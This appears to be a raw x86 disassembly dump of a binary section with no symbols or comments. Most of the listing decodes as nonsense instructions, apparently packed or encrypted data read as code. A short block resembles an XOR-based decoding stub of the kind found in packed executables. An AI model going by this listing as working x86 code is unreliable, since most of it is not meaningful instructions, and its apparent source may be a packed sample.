  409705:	sbb    bl,ah
  409707:	aas    
  409708:	test   BYTE PTR [esp+ecx*1+0x68],dh
  40970c:	push   ebx
  40970d:	(bad)
  409710:	imul   edi,DWORD PTR [ebx-0x750b5208],0xcd12a7d3
  40971a:	dec    ecx
  40971b:	or     DWORD PTR [edi],edx
  40971d:	cli    
  40971e:	fistp  DWORD PTR ds:0x3aeca931
  409724:	push   cs
  409725:	dec    esp
  409726:	mov    ds:0xdc31cff,eax
  40972b:	mov    ?,WORD PTR [ecx-0x1f0de18e]
  409731:	push   ecx
  409732:	clc    
  409733:	fisubr DWORD PTR [edx-0xb4b6850]
  409739:	sahf   
  40973a:	je     0x409731
  40973c:	aas    
  40973d:	xor    BYTE PTR [ebp+0x605021b],0x17
  409744:	push   esi
  409745:	cmp    al,0xdc
  409747:	jb     0x4097bd
  409749:	cli    
  40974a:	sub    DWORD PTR [edi-0x2b1805d1],0xffffffbd
  409751:	test   esp,ebp
  409753:	xchg   esp,eax
  409754:	inc    esi
  409755:	fsubr  st,st(4)
  409757:	pop    ecx
  409758:	out    0xa2,al
  40975a:	cmp    ch,al
  40975c:	imul   ebp,ebx,0xffffffe8
  40975f:	lahf   
  409760:	pop    esi
  409761:	sti    
  409762:	popf   
  409763:	cmc    
  409764:	pop    ds
  409765:	pop    ebx
  409766:	adc    bl,BYTE PTR [edi+0x231c1be9]
  40976c:	jnp    0x409732
  40976e:	test   eax,0xc77d761c
  409773:	xchg   edi,eax
  409774:	push   ds
  409775:	xor    BYTE PTR [edi],dl
  409777:	callw  0xa14d
  40977b:	dec    ecx
  40977c:	loop   0x4097cc
  40977e:	mov    dh,cl
  409780:	adc    al,0x3f
  409782:	push   ds
  409783:	jmp    0x7fde:0xbd510e9c
  40978a:	icebp  
  40978b:	xchg   ecx,eax
  40978c:	adc    al,0xb8
  40978e:	and    ebx,DWORD PTR [ebp-0x111a910a]
  409794:	push   esi
  409795:	sbb    DWORD PTR [edx],edi
  409797:	mov    ds:0xccb9fe17,eax
  40979c:	scas   eax,DWORD PTR es:[edi]
  40979d:	retf   0x51ae
  4097a0:	enter  0x1ee,0xd0
  4097a4:	faddp  st(5),st
  4097a6:	mov    bl,0xa8
  4097a8:	push   ds
  4097a9:	call   FWORD PTR [ecx]
  4097ab:	mov    eax,0x9a5614ee
  4097b0:	fistp  QWORD PTR [ecx+0x61]
  4097b3:	cwde   
  4097b4:	imul   eax,DWORD PTR [eax-0x1330fe5d],0xffffff91
  4097bb:	cmp    esp,DWORD PTR [ebp+ebx*8+0xf03ea42]
  4097c2:	pop    es
  4097c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097c4:	pop    ebx
  4097c5:	or     bl,BYTE PTR [ebx-0x19cb8291]
  4097cb:	cmp    dl,ch
  4097cd:	call   0x9ac22bc3
  4097d2:	sbb    al,0x4f
  4097d4:	cmp    BYTE PTR [eax-0x3aa0a935],dl
  4097da:	ret    0x6d69
  4097dd:	std    
  4097de:	mov    ah,0x44
  4097e0:	and    BYTE PTR [esi+0x4b],al
  4097e3:	jbe    0x409804
  4097e5:	push   ebp
  4097e6:	jno    0x40980b
  4097e8:	test   eax,0x4d89a7dc
  4097ed:	sub    al,0xa5
  4097ef:	cmp    al,0xca
  4097f1:	mov    edx,0xd6ca45ce
  4097f6:	sbb    al,0xe0
  4097f8:	pop    esi
  4097f9:	pop    ebx
  4097fa:	inc    edx
  4097fb:	mov    ecx,0x4221e548
  409800:	mov    esp,esp
  409802:	add    eax,0x508b3cfd
  409807:	aas    
  409808:	cmp    ah,0x72
  40980b:	scas   al,BYTE PTR es:[edi]
  40980c:	push   ss
  40980d:	and    BYTE PTR [edi],ah
  40980f:	xchg   ecx,eax
  409810:	ins    DWORD PTR es:[edi],dx
  409811:	push   eax
  409812:	sbb    eax,0x4065aad
  409817:	cmc    
  409818:	cmc    
  409819:	jb     0x4097b7
  40981b:	inc    ecx
  40981c:	(bad)  
  40981d:	mov    edx,0x8aa8c8fe
  409822:	cmp    ebp,esp
  409824:	xor    BYTE PTR [ecx],dh
  409826:	retf   0x242a
  409829:	ret    0xe27d
  40982c:	aad    0x55
  40982e:	xor    esp,DWORD PTR [edx-0x3311622f]
  409834:	fild   QWORD PTR [ebx+ebp*2-0x9]
  409838:	mov    ch,BYTE PTR [eax-0x5143e347]
  40983e:	mov    ah,0xfd
  409840:	idiv   DWORD PTR [edi]
  409842:	push   ds
  409843:	push   ebp
  409844:	jnp    0x40981a
  409846:	(bad)  
  409847:	sub    cl,BYTE PTR [esi]
  409849:	xor    eax,0x48531ee4
  40984e:	sbb    DWORD PTR [ebx],ecx
  409850:	cs jecxz 0x409871
  409853:	jb     0x409842
  409855:	xchg   ebx,eax
  409856:	loop   0x409895
  409858:	adc    dh,BYTE PTR [edi+edi*1-0x3a]
  40985c:	pop    esi
  40985d:	or     ah,BYTE PTR [edi+0x20738d2d]
  409863:	ror    DWORD PTR [eax],1
  409865:	aad    0x79
  409867:	mov    DWORD PTR [edi+0x7aa46f17],esi
  40986d:	sbb    dl,ch
  40986f:	sub    BYTE PTR [ecx],dl
  409871:	mov    esi,0x919da02
  409876:	mov    eax,0x76e0c6bc
  40987b:	xchg   ebp,eax
  40987c:	xchg   esi,eax
  40987d:	imul   esp,ecx,0x4
  409880:	test   al,0x7a
  409882:	sbb    DWORD PTR [esi-0x1eb334a8],ebx
  409888:	push   es
  409889:	mov    BYTE PTR [esi+edi*8-0x21],ch
  40988d:	aaa    
  40988e:	aaa    
  40988f:	js     0x40986e
  409891:	and    eax,0x7c3908ad
  409896:	aad    0xfa
  409898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409899:	rcl    BYTE PTR [edx],1
  40989b:	popa   
  40989c:	push   ss
  40989d:	fisub  WORD PTR [edx]
  40989f:	jo     0x40990d
  4098a1:	int3   
  4098a2:	add    edi,ecx
  4098a4:	dec    ebp
  4098a5:	hlt    
  4098a6:	mov    ah,0x4b
  4098a8:	ror    BYTE PTR [edi+0x6e30b8cd],0x91
  4098af:	nop
  4098b0:	call   0xa164:0x3e7a6f35
  4098b7:	jb     0x40984f
  4098b9:	add    bl,BYTE PTR [ebp+ebx*1+0x66]
  4098bd:	fisub  DWORD PTR [ecx-0x2c]
  4098c0:	add    DWORD PTR [edi],edi
  4098c2:	rcl    dh,cl
  4098c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098c5:	and    BYTE PTR [esi-0x1a],dl
  4098c8:	pop    ecx
  4098c9:	dec    edx
  4098ca:	test   eax,0x8a75b05b
  4098cf:	cmp    ecx,DWORD PTR ss:[eax-0x26]
  4098d3:	int    0xed
  4098d5:	push   ss
  4098d6:	out    dx,eax
  4098d7:	adc    BYTE PTR ds:0xf42f3e68,ch
  4098dd:	into   
  4098de:	mov    ebx,0x9f8b3f5c
  4098e3:	ficomp WORD PTR [esi]
  4098e5:	push   0xf3396a0e
  4098ea:	stos   BYTE PTR es:[edi],al
  4098eb:	pop    ebx
  4098ec:	out    0x93,eax
  4098ee:	jmp    0x6500ba
  4098f3:	mov    eax,0x1788d627
  4098f8:	(bad)  
  4098f9:	mov    cl,0x18
  4098fb:	pop    ebx
  4098fc:	xchg   ecx,eax
  4098fd:	outs   dx,DWORD PTR ds:[esi]
  4098fe:	retf   
  4098ff:	cmp    al,0x9b
  409901:	mov    ds:0x8ba98d66,eax
  409906:	test   eax,0xc0e10711
  40990b:	dec    edi
  40990c:	arpl   WORD PTR [ebx+0x4e],sp
  40990f:	push   edx
  409910:	cmp    esp,DWORD PTR [edi+ebp*1+0x78]
  409914:	jecxz  0x4098b9
  409916:	and    al,0x7c
  409918:	xchg   edi,eax
  409919:	push   esp
  40991a:	and    DWORD PTR [ecx+0x446b1bb9],ebx
  409920:	sbb    eax,0x113b8111
  409925:	cmp    DWORD PTR [ebx-0x55],0x5d0c484c
  40992c:	fcomp  DWORD PTR [ebx+ebx*1+0x10]
  409930:	popa   
  409931:	iret   
  409932:	pop    ebx
  409933:	push   0xffffffca
  409935:	frstor [esi]
  409937:	dec    eax
  409938:	in     al,0x23
  40993a:	push   ebx
  40993b:	sbb    eax,0x98d09eba
  409940:	dec    ecx
  409941:	mov    ch,0x6b
  409943:	jmp    0xec7097a
  409948:	retf   
  409949:	cmp    eax,0x2a834502
  40994e:	test   eax,0x6c65f91f
  409953:	test   al,0xcd
  409955:	cmp    edi,DWORD PTR [ebp+0x32ce626c]
  40995b:	loopne 0x4099ad
  40995d:	(bad)  
  40995f:	xchg   BYTE PTR [eax+edi*2-0x297fb967],dl
  409966:	outs   dx,DWORD PTR ds:[esi]
  409967:	rol    DWORD PTR [ebx],0xc3
  40996a:	or     eax,0x16498735
  40996f:	jb     0x4099a8
  409971:	xor    ah,BYTE PTR [edx-0x6de60be]
  409977:	mov    ch,0xb4
  409979:	scas   eax,DWORD PTR es:[edi]
  40997a:	lahf   
  40997b:	ror    BYTE PTR [ebp-0x398c7c67],0x6f
  409982:	inc    edi
  409983:	scas   al,BYTE PTR es:[edi]
  409984:	cs ja  0x409916
  409987:	inc    eax
  409988:	call   0x94264a9b
  40998d:	adc    DWORD PTR [esi-0x3281f00a],0xa7bae22d
  409997:	stc    
  409998:	inc    ebp
  409999:	push   es
  40999a:	ins    BYTE PTR es:[edi],dx
  40999b:	cli    
  40999c:	test   BYTE PTR [edi-0x36],0xab
  4099a0:	mov    edi,0xae9ac0a3
  4099a5:	add    al,0x88
  4099a7:	(bad)  
  4099a8:	xchg   ebp,eax
  4099a9:	mov    edx,DWORD PTR [edi+0x3c634320]
  4099af:	mov    esi,esp
  4099b1:	nop
  4099b2:	mov    al,0x2a
  4099b4:	cwde   
  4099b5:	cmc    
  4099b6:	ss sbb bx,ax
  4099ba:	adc    BYTE PTR [eax],al
  4099bc:	cmp    ch,BYTE PTR [ebx]
  4099be:	sub    BYTE PTR [eax],al
  4099c0:	sub    esp,esi
  4099c2:	add    al,0x3
  4099c4:	idiv   DWORD PTR [esi]
  4099c6:	add    DWORD PTR [ebx+0x1fd4a439],edx
  4099cc:	push   esp
  4099cd:	lea    ebx,[ecx+0x5d566f89]
  4099d3:	push   edi
  4099d4:	xchg   ecx,eax
  4099d5:	outs   dx,BYTE PTR ds:[esi]
  4099d6:	sub    eax,0x8536164d
  4099db:	cs adc al,0xc
  4099de:	test   eax,0x5a2184b3
  4099e3:	mov    al,ds:0x44715467
  4099e8:	push   cs
  4099e9:	out    dx,al
  4099ea:	xor    eax,0x7a34e11f
  4099ef:	or     dl,BYTE PTR [edx-0x33]
  4099f2:	or     esp,ecx
  4099f4:	mov    al,ds:0x20657118
  4099f9:	mov    edx,0x5ada691
  4099fe:	fadd   st(3),st
  409a00:	mov    BYTE PTR ds:0x1df595fc,bh
  409a06:	test   al,0xa9
  409a08:	mov    esi,0xb87a7743
  409a0d:	xchg   esp,eax
  409a0e:	and    eax,0x3130fd6f
  409a13:	int    0x13
  409a15:	es (bad) 
  409a17:	and    eax,0xed25e967
  409a1c:	fiadd  WORD PTR [ecx+0xcb897b0]
  409a22:	(bad)  [esi-0x1d]
  409a25:	out    0xc6,eax
  409a27:	mov    es,WORD PTR [ebx+0x6433cbf0]
  409a2d:	into   
  409a2e:	xor    BYTE PTR [eax+0x4921b65c],bl
  409a34:	add    al,BYTE PTR [ebx-0x58]
  409a37:	sub    dl,bl
  409a39:	adc    BYTE PTR [eax-0x5acba268],al
  409a3f:	cld    
  409a40:	mov    DWORD PTR [esi],edi
  409a42:	js     0x409a67
  409a44:	imul   BYTE PTR [edx-0x6c6be32d]
  409a4a:	xchg   BYTE PTR [ecx],al
  409a4c:	mov    fs,WORD PTR [ecx+ebx*8+0x11e44637]
  409a53:	dec    eax
  409a54:	sub    eax,0xc4c2ad5b
  409a59:	rcr    DWORD PTR [ebx-0x7d24f1ec],cl
  409a5f:	fidivr WORD PTR [ebx+eiz*8+0x2a]
  409a63:	sbb    eax,0x6e76786a
  409a68:	cdq    
  409a69:	pop    ds
  409a6a:	push   esi
  409a6b:	mov    edi,0x798c7dad
  409a70:	cmp    al,BYTE PTR [edx+0x12]
  409a73:	lods   eax,DWORD PTR ds:[esi]
  409a74:	inc    ecx
  409a75:	push   ds
  409a76:	cli    
  409a77:	or     eax,0x5d503f34
  409a7c:	inc    edi
  409a7d:	scas   al,BYTE PTR es:[edi]
  409a7e:	mov    WORD PTR [ebx+0x14],gs
  409a81:	stos   BYTE PTR es:[edi],al
  409a82:	adc    dh,al
  409a84:	add    eax,0x95364c5
  409a89:	push   0xffffffc4
  409a8b:	fstp   QWORD PTR [edx-0x1e22b4e6]
  409a91:	jb     0x409ab0
  409a93:	add    DWORD PTR ds:0xb437e2b4,edx
  409a99:	sub    DWORD PTR [esi],esi
  409a9b:	lods   al,BYTE PTR ds:[esi]
  409a9c:	dec    edi
  409a9d:	dec    esp
  409a9e:	pop    esp
  409a9f:	scas   eax,DWORD PTR es:[edi]
  409aa0:	pusha  
  409aa1:	or     ebp,DWORD PTR [edx+esi*2+0x5f385e6b]
  409aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aa9:	in     eax,0xda
  409aab:	cmp    bh,BYTE PTR [esp+esi*1]
  409aae:	jns    0x409afc
  409ab0:	std    
  409ab1:	ja     0x409af7
  409ab3:	dec    esp
  409ab4:	xor    ecx,ecx
  409ab6:	pop    ebp
  409ab7:	loope  0x409b0f
  409ab9:	mov    ecx,DWORD PTR ds:0x422008
  409abf:	add    ecx,DWORD PTR ds:0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409b8e
  409b48:	ins    BYTE PTR es:[edi],dx
  409b49:	cmp    DWORD PTR [edi+0x39],esp
  409b4c:	add    al,0x7a
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	not    ah
  409b55:	mov    edx,0x80ee2eb0
  409b5a:	cs js  0x409bc2
  409b5d:	and    ch,dl
  409b5f:	add    eax,0x731768a7
  409b64:	dec    esi
  409b65:	push   0xd865e1de
  409b6a:	jnp    0x409af3
  409b6c:	test   ebp,esi
  409b6e:	xchg   DWORD PTR [edi],edx
  409b70:	sahf   
  409b71:	cmc    
  409b72:	fs mov edx,0xbd8c799d
  409b78:	xchg   WORD PTR [eax+0x2683a967],sp
  409b7f:	push   0x78405d59
  409b84:	lahf   
  409b85:	and    esp,eax
  409b87:	mov    bh,0x56
  409b89:	imul   ecx,esi,0xfffffff8
  409b8c:	mov    BYTE PTR [ebp-0x5f],cl
  409b8f:	cs push es
  409b91:	xchg   esi,eax
  409b92:	xchg   ecx,eax
  409b93:	stos   DWORD PTR es:[edi],eax
  409b94:	xchg   esp,eax
  409b95:	or     dl,BYTE PTR [eax+ebp*1]
  409b98:	cmp    al,0xaa
  409b9a:	call   FWORD PTR [eax-0x31]
  409b9d:	enter  0xa16d,0x75
  409ba1:	adc    edx,DWORD PTR [eax+ecx*8+0x13]
  409ba5:	xchg   esp,eax
  409ba6:	rol    DWORD PTR [eax-0x74d1f8c8],1
  409bac:	cld    
  409bad:	aad    0x83
  409baf:	ss loopne 0x409b65
  409bb2:	test   DWORD PTR [esi*2-0x4efc729a],edx
  409bb9:	mov    dl,0x9a
  409bbb:	add    BYTE PTR [ecx+eax*4-0x1d0f1a37],bl
  409bc2:	xor    eax,0x38e7fd2f
  409bc7:	inc    ecx
  409bc8:	add    bl,BYTE PTR [edi]
  409bca:	pop    edx
  409bcb:	adc    eax,edx
  409bcd:	popf   
  409bce:	xlat   BYTE PTR ds:[ebx]
  409bcf:	lods   eax,DWORD PTR ds:[esi]
  409bd0:	daa    
  409bd1:	adc    DWORD PTR [esi+ecx*2+0x46875301],edi
  409bd8:	jb     0x409c10
  409bda:	shl    DWORD PTR [ebx-0x74],cl
  409bdd:	rcl    DWORD PTR [esp+ebp*2-0x6d25246f],cl
  409be4:	out    dx,al
  409be5:	in     eax,0x46
  409be7:	retf   0x9b4e
  409bea:	jne    0x409be3
  409bec:	clc    
  409bed:	ds mov dh,0x94
  409bf0:	mov    WORD PTR [ebx],ss
  409bf2:	hlt    
  409bf3:	push   ds
  409bf4:	cmp    DWORD PTR [ebp+0x7960fdcc],0xffffffe4
  409bfb:	mov    dl,0xce
  409bfd:	pop    eax
  409bfe:	pop    es
  409bff:	sub    bl,BYTE PTR [eax]
  409c01:	mov    ah,BYTE PTR [ebx]
  409c03:	call   0x2407:0x6d2005bb
  409c0a:	loopne 0x409bd3
  409c0c:	push   es
  409c0d:	dec    ebx
  409c0e:	inc    eax
  409c0f:	pop    es
  409c10:	shl    BYTE PTR [edi],0x41
  409c13:	ficomp DWORD PTR [ecx+0x60]
  409c16:	neg    BYTE PTR [eax-0x62068b63]
  409c1c:	lahf   
  409c1d:	popa   
  409c1e:	pushf  
  409c1f:	aaa    
  409c20:	inc    ecx
  409c21:	push   ebx
  409c22:	scas   eax,DWORD PTR es:[edi]
  409c23:	or     al,0x43
  409c25:	mov    al,ds:0xc166a147
  409c2a:	cmp    ebx,DWORD PTR [esi]
  409c2c:	ja     0x409c4a
  409c2e:	mov    ah,0xaa
  409c30:	inc    edx
  409c31:	shr    bh,0xe1
  409c34:	xchg   ecx,eax
  409c35:	fstp   DWORD PTR ds:0xea54da38
  409c3b:	ins    BYTE PTR es:[edi],dx
  409c3c:	jg     0x409bf4
  409c3e:	and    DWORD PTR ds:0x9dd634c5,0xffffffa2
  409c45:	sbb    al,0x4f
  409c47:	add    eax,0x341abe5
  409c4c:	mov    esp,0xf66930b8
  409c51:	sbb    BYTE PTR [edx],al
  409c53:	rcl    DWORD PTR [ebx-0x10fd1031],1
  409c59:	inc    ebp
  409c5a:	pop    ebx
  409c5b:	xor    al,0x61
  409c5d:	xchg   ebp,eax
  409c5e:	cmp    eax,0x2d37a259
  409c63:	dec    edx
  409c64:	fild   DWORD PTR [esi+0x34]
  409c67:	arpl   WORD PTR [ecx-0xb],sp
  409c6a:	add    eax,0xfe229a35
  409c6f:	outs   dx,BYTE PTR ds:[esi]
  409c70:	or     eax,0xc2a0ff6c
  409c75:	imul   DWORD PTR [ecx-0x23e1cfbc]
  409c7b:	sub    ah,ch
  409c7d:	adc    edx,DWORD PTR [ebp+0x31]
  409c80:	dec    esp
  409c81:	push   ss
  409c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c83:	mov    edi,0xdce8550
  409c88:	idiv   cl
  409c8a:	imul   esi,DWORD PTR [ebx+0x27f57995],0x47
  409c91:	mov    esp,0x6ec9b973
  409c96:	arpl   WORD PTR [edx+ecx*1-0x15e0f0d],dx
  409c9d:	les    esi,FWORD PTR [ebx-0x59]
  409ca0:	sub    al,0x71
  409ca2:	or     DWORD PTR [ebp-0x6cfe9f2f],0x95a3bc3b
  409cac:	adc    ebx,esi
  409cae:	xchg   esi,eax
  409caf:	(bad)  
  409cb0:	call   DWORD PTR ds:0x40e3888f
  409cb6:	shl    BYTE PTR [ebp-0x35427c11],0x5f
  409cbd:	and    DWORD PTR [ecx],edi
  409cbf:	out    0x5,eax
  409cc1:	push   cs
  409cc2:	sub    BYTE PTR [eax+0x2eca54ba],bh
  409cc8:	or     eax,DWORD PTR [ecx-0x51]
  409ccb:	add    eax,esi
  409ccd:	adc    ah,BYTE PTR [esi]
  409ccf:	stos   DWORD PTR es:[edi],eax
  409cd0:	mov    bl,ah
  409cd2:	push   eax
  409cd3:	fsubr  QWORD PTR [ebp-0x68]
  409cd6:	xor    eax,0x43b2207
  409cdb:	xchg   esp,eax
  409cdc:	cli    
  409cdd:	rcr    BYTE PTR [esi-0x2e63fce0],0x3
  409ce4:	test   BYTE PTR [ecx+0x64],bl
  409ce7:	aad    0x74
  409ce9:	dec    esp
  409cea:	sbb    BYTE PTR [eax-0x38bd0817],cl
  409cf0:	loopne 0x409d70
  409cf2:	inc    esp
  409cf3:	shl    BYTE PTR ds:0x1b81d605,cl
  409cf9:	jecxz  0x409d61
  409cfb:	pop    ss
  409cfc:	jge    0x409c88
  409cfe:	xchg   esp,eax
  409cff:	in     al,dx
  409d00:	adc    eax,0x50a30317
  409d05:	test   eax,0xcfb448b5
  409d0a:	test   BYTE PTR [eax+edi*1+0x2d157cfc],ch
  409d11:	fiadd  DWORD PTR [edx-0x7]
  409d14:	out    dx,eax
  409d15:	sbb    eax,0x67e72ccd
  409d1a:	xor    al,ah
  409d1c:	add    ebx,edx
  409d1e:	cmp    bh,bl
  409d20:	sahf   
  409d21:	and    dl,BYTE PTR [eax]
  409d23:	aaa    
  409d24:	push   ss
  409d25:	cmc    
  409d26:	xchg   esp,eax
  409d27:	inc    ecx
  409d28:	ror    BYTE PTR [edi-0x51],cl
  409d2b:	jp     0x409cd9
  409d2d:	aas    
  409d2e:	mov    ebp,0x400e18b3
  409d33:	repnz add edx,DWORD PTR [ecx+0x55]
  409d37:	leave  
  409d38:	std    
  409d39:	in     eax,dx
  409d3a:	stos   BYTE PTR es:[edi],al
  409d3b:	pop    edx
  409d3c:	out    dx,eax
  409d3d:	les    esp,FWORD PTR [esi]
  409d3f:	xlat   BYTE PTR ds:[ebx]
  409d40:	dec    ebx
  409d41:	nop
  409d42:	xchg   edx,eax
  409d43:	fidivr DWORD PTR [ecx]
  409d45:	ins    DWORD PTR es:[edi],dx
  409d46:	pop    ds
  409d47:	xchg   esp,eax
  409d48:	adc    eax,0x440c9979
  409d4d:	test   edi,edx
  409d4f:	adc    al,0x4c
  409d51:	mov    ds:0xa19b9e43,eax
  409d56:	vpsubsw ymm5,ymm2,YMMWORD PTR [esi+eax*1+0x12]
  409d5c:	cmp    BYTE PTR [ecx],bl
  409d5e:	push   ss
  409d5f:	xor    esi,DWORD PTR [edi+esi*4+0x69]
  409d63:	sbb    DWORD PTR [ebp-0x51be5169],ebp
  409d69:	cmp    bh,BYTE PTR [edi+0x36759818]
  409d6f:	cmp    eax,0x9de1f582
  409d74:	cmp    esp,DWORD PTR [edx-0x6a14fe99]
  409d7a:	mov    bl,0x88
  409d7c:	jne    0x409dcc
  409d7e:	push   eax
  409d7f:	or     DWORD PTR [ebx],eax
  409d81:	dec    ebx
  409d82:	cmovge ebx,esp
  409d85:	iret   
  409d86:	ret    0x2ba8
  409d89:	scas   al,BYTE PTR es:[edi]
  409d8a:	add    ecx,DWORD PTR [edi]
  409d8c:	ins    BYTE PTR es:[edi],dx
  409d8d:	test   ecx,ebp
  409d8f:	fs xchg ebp,eax
  409d91:	dec    ebx
  409d92:	xchg   ecx,eax
  409d93:	dec    ecx
  409d94:	inc    esi
  409d95:	sahf   
  409d96:	imul   esp,DWORD PTR [edi+0x48],0xc66a19ce
  409d9d:	es ja  0x409e0b
  409da0:	inc    esi
  409da1:	(bad)
  409da4:	mov    al,0xc1
  409da6:	cmc    
  409da7:	aam    0xf6
  409da9:	push   0xffffffaa
  409dab:	mov    bh,0x44
  409dad:	fimul  WORD PTR [esi-0x69f6ab03]
  409db3:	push   ebp
  409db4:	enter  0x6843,0x8f
  409db8:	aaa    
  409db9:	fimul  WORD PTR [edx-0x79]
  409dbc:	push   eax
  409dbd:	jmp    0x9e97:0x908da796
  409dc4:	rol    eax,1
  409dc6:	sub    BYTE PTR [edi-0x7b58296f],al
  409dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dcd:	outs   dx,DWORD PTR ds:[esi]
  409dce:	(bad)  
  409dcf:	out    dx,al
  409dd0:	jmp    esp
  409dd2:	xlat   BYTE PTR ds:[ebx]
  409dd3:	adc    dh,ch
  409dd5:	in     eax,0x29
  409dd7:	pop    ds
  409dd8:	call   0xcc869f7
  409ddd:	pop    ecx
  409dde:	jmp    0x409dc1
  409de0:	pop    esp
  409de1:	mov    al,ds:0xc56ccc28
  409de6:	sub    DWORD PTR [eax],edi
  409de8:	mov    bh,0x4a
  409dea:	neg    dl
  409dec:	cmp    eax,0x3fbfeb46
  409df1:	sbb    eax,0x69e42ad6
  409df6:	ds stc 
  409df8:	mov    ds:0x53bf4c33,al
  409dfd:	jmp    0xc34d90cb
  409e02:	leave  
  409e03:	dec    ecx
  409e04:	popf   
  409e05:	add    dl,cl
  409e07:	leave  
  409e08:	ins    DWORD PTR es:[edi],dx
  409e09:	call   DWORD PTR [esi-0x74]
  409e0c:	mov    esi,0xe3a95930
  409e11:	data16 hlt 
  409e13:	xor    BYTE PTR ds:0x6b5becbd,bh
  409e19:	sahf   
  409e1a:	mov    ebx,0x20329a80
  409e1f:	cmp    bl,0xbc
  409e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e23:	cmp    ch,BYTE PTR [ebx+eiz*8-0x1d7a44a0]
  409e2a:	or     dl,BYTE PTR [bp+0x6619]
  409e2f:	scas   eax,DWORD PTR es:[edi]
  409e30:	jl     0x409e90
  409e32:	jmp    0xe963428e
  409e37:	xor    DWORD PTR [ebp-0x30e8f67c],edi
  409e3d:	test   BYTE PTR [ecx+ecx*2+0xdaba8a9],bh
  409e44:	lock push bp
  409e47:	out    0x90,al
  409e49:	mov    ds:0xe3bad720,al
  409e4e:	call   DWORD PTR [edx+0x421d597f]
  409e54:	mov    edx,0x534a5442
  409e59:	xor    eax,0x134f4f93
  409e5e:	adc    esp,DWORD PTR [esp+esi*8]
  409e61:	or     al,0x4
  409e63:	(bad)  
  409e64:	out    dx,eax
  409e65:	or     al,bl
  409e67:	data16 je 0x409e3a
  409e6a:	iret   
  409e6b:	mov    edx,0xe8fb379e
  409e70:	cmp    DWORD PTR ds:0x17e14709,eax
  409e76:	daa    
  409e77:	push   edi
  409e78:	ins    DWORD PTR es:[edi],dx
  409e79:	jbe    0x409ea2
  409e7b:	test   edx,ebp
  409e7d:	lods   eax,DWORD PTR ds:[esi]
  409e7e:	out    0x48,eax
  409e80:	stos   BYTE PTR es:[edi],al
  409e81:	pop    ebp
  409e82:	inc    esi
  409e83:	or     al,0x3f
  409e85:	inc    esi
  409e86:	cmp    eax,0xd2dc49d9
  409e8b:	(bad)  
  409e8c:	js     0x409e8c
  409e8e:	and    ebx,DWORD PTR [esi]
  409e90:	jne    0x409e15
  409e92:	movs   WORD PTR es:[di],WORD PTR ds:[si]
  409e95:	jne    0x409e62
  409e97:	iret   
  409e98:	mov    ah,0xf
  409e9a:	adc    ecx,0x6a
  409e9d:	xor    DWORD PTR [edx+0x2b],esp
  409ea0:	cmp    ch,BYTE PTR [edi]
  409ea2:	and    edi,eax
  409ea4:	adc    dl,0xe1
  409ea7:	sub    al,0xdc
  409ea9:	rcl    ebx,1
  409eab:	(bad)
  409eaf:	fxch   st(5)
  409eb1:	push   eax
  409eb2:	stc    
  409eb3:	stos   BYTE PTR es:[edi],al
  409eb4:	test   eax,0x53e72cb8
  409eb9:	retf   
  409eba:	jmp    0x841:0xbf5b2a7b
  409ec1:	ds xor al,0x30
  409ec4:	in     eax,0x7f
  409ec6:	pop    ds
  409ec7:	dec    esp
  409ec8:	jno    0x409e81
  409eca:	std    
  409ecb:	add    al,0xea
  409ecd:	push   edi
  409ece:	(bad)  
  409ecf:	neg    DWORD PTR [edi-0x181123d4]
  409ed5:	mov    eax,ds:0xee89e2a4
  409eda:	dec    edi
  409edb:	inc    esp
  409edc:	cmp    bl,BYTE PTR ds:0xbff7efcc
  409ee2:	scas   al,BYTE PTR es:[edi]
  409ee3:	xchg   bp,ax
  409ee5:	in     eax,dx
  409ee6:	push   es
  409ee7:	jl     0x409ef1
  409ee9:	fucomp st(7)
  409eeb:	add    al,0x4b
  409eee:	popf   
  409eef:	retf   0xf0b9
  409ef2:	pop    es
  409ef3:	imul   ebp,DWORD PTR [ecx+eiz*8-0x42f35569],0xffffffcd
  409efb:	dec    edi
  409efc:	mov    ecx,0x215324bc
  409f01:	lock outs dx,BYTE PTR ds:[esi]
  409f03:	test   al,0x7a
  409f05:	js     0x409ee0
  409f07:	or     al,0x42
  409f09:	ins    BYTE PTR es:[edi],dx
  409f0a:	mov    WORD PTR [ebx+0x38302739],fs
  409f10:	in     eax,dx
  409f11:	xchg   dh,al
  409f13:	test   eax,edx
  409f15:	jne    0x409ec7
  409f17:	sar    bh,cl
  409f19:	in     al,dx
  409f1a:	div    BYTE PTR [ecx-0x41]
  409f1d:	push   ebp
  409f1e:	jno    0x409f20
  409f20:	dec    esp
